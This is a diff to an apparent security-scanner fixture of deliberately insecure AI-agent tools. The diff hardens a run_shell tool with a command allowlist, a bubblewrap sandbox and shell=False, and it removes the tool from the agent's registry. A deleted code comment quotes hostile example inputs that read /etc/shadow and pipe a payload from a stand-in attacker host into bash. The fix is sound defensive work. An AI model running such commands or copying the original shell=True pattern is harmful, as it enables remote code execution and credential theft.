@@ -5,7 +5,7 @@ SECURITY FIXTURE — This file contains deliberately insecure tool implementatio
 for use as a Trent scan validation fixture. Do NOT use this code in production.
 
 Planted findings (application tier):
-  VULN-APP-001: run_shell — RCE via shell=True with user-supplied command string
+  VULN-APP-001: run_shell — (fixed) allowlisted argv run via a sandbox launcher, shell=False
   VULN-APP-002: fetch_url — (fixed) HTTPS host allowlist, private-range blocking, redirect cap
   VULN-APP-003: read_file — (fixed) path allowlist, traversal/symlink and secret-file denial
 
@@ -20,6 +20,7 @@ import logging
 import math
 import os
 import re
+import shlex
 import socket
 import subprocess
 import urllib.error
@@ -149,6 +150,24 @@ def read_file(path: str) -> str:
         return _truncate_output("read_file", f.read())
 
 
+# Narrow allowlist of operational commands; matched against the first argv token.
+SHELL_ALLOWED_COMMANDS = frozenset({"date", "uptime", "hostname"})
+
+# bubblewrap: unshared network namespace, read-only root, empty tmpfs, no host mounts.
+SANDBOX_LAUNCHER = "/usr/bin/bwrap"
+SANDBOX_LAUNCHER_ARGS = (
+    "--unshare-all",
+    "--die-with-parent",
+    "--ro-bind", "/usr", "/usr",
+    "--symlink", "usr/bin", "/bin",
+    "--symlink", "usr/lib", "/lib",
+    "--symlink", "usr/lib64", "/lib64",
+    "--proc", "/proc",
+    "--dev", "/dev",
+    "--tmpfs", "/tmp",
+)
+
+
 @tool
 def run_shell(command: str) -> str:
     """Run a shell command and return its combined stdout+stderr output.
@@ -159,12 +178,20 @@ def run_shell(command: str) -> str:
     Returns:
         str, truncated to 50,000 characters.
     """
-    # VULN-APP-001: shell=True passes the command string to /bin/sh verbatim.
-    # A caller supplying "ls; cat /etc/shadow" or "$(curl attacker.com/payload | bash)"
-    # gets arbitrary code execution on the host.
+    try:
+        argv = shlex.split(command)
+    except ValueError:
+        raise ValueError("command could not be parsed")
+    if not argv or argv[0] not in SHELL_ALLOWED_COMMANDS:
+        raise ValueError("command is not in the approved allowlist")
+    if not os.path.isfile(SANDBOX_LAUNCHER) or not os.access(SANDBOX_LAUNCHER, os.X_OK):
+        raise RuntimeError("sandbox launcher is unavailable; refusing to run command")
+    # Fail closed: the launcher runs argv with no network (so no route to the instance
+    # metadata address), a read-only root and no host credential paths mounted.
     result = subprocess.run(
-        command,
-        shell=True,
+        [SANDBOX_LAUNCHER, *SANDBOX_LAUNCHER_ARGS, "--", *argv],
+        shell=False,
+        env={},
         capture_output=True,
         text=True,
         timeout=30,
@@ -339,13 +366,13 @@ def delegate_to_sub_agent(task: str) -> str:
     return "delegated"
 
 
-# Tool registry — the orchestrator binds the ops tools, the domain tools, and the
-# sub-agent delegation tool. The generic ops tools (read_file/run_shell/fetch_url) are
+# Tool registry — run_shell is deliberately not registered (no support task needs it).
+# The orchestrator binds the ops tools, the domain tools, and the
+# sub-agent delegation tool. The generic ops tools (read_file/fetch_url) are
 # internal/debug tools that should NOT be exposed to a customer-facing agent — their
 # presence is itself a finding.
 ALL_TOOLS = [
     read_file,
-    run_shell,
     fetch_url,
     lookup_order,
     issue_refund,
